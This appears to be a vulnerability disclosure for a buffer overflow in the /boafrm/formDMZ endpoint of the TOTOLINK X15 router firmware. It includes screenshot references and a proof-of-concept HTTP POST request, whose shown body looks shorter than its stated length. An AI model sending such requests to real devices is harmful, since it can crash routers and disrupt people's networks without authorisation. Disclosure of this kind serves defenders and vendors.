

# Information



**Vendor of the products:** TOTOLINK

**Vendor's website:** [TOTOLINK](https://www.totolink.net/)

**Affected products:** X15

**Affected firmware version:** V1.0.0-B20230714.1105

**Firmware download address:** [download]([TOTOLINK](https://www.totolink.net/home/menu/detail/menu_listtpl/download/id/253/ids/36.html))

# Overview

TOTOLINK X15 V1.0.0-B20230714.1105 router has a serious buffer overflow vulnerability. This vulnerability can be triggered through the route /boafrm/formDMZ. An attacker can implement a denial of service attack by sending a malicious HTTP POST request.

# Vulnerability details

![image-20250605134233309](8/image-20250605134233309.png)

Here we bypass a judgment and enter the else if branch

![image-20250605142733057](8/image-20250605142733057.png)

There is a buffer overflow here

![image-20250605142756857](8/image-20250605142756857.png)



# POC

```
POST /boafrm/formDMZ HTTP/1.1
Host: 192.168.0.1
User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:138.0) Gecko/20100101 Firefox/138.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded
Content-Length: 906
Origin: http://192.168.0.1
Connection: close
Referer: http://192.168.0.1/smart_qos.htm
Upgrade-Insecure-Requests: 1
Priority: u=4

sessionCheck=4b153e37048eedd06bc44e2dd11d60ae&submit-url=http:&save=b&save_apply=c&enabled=1
```
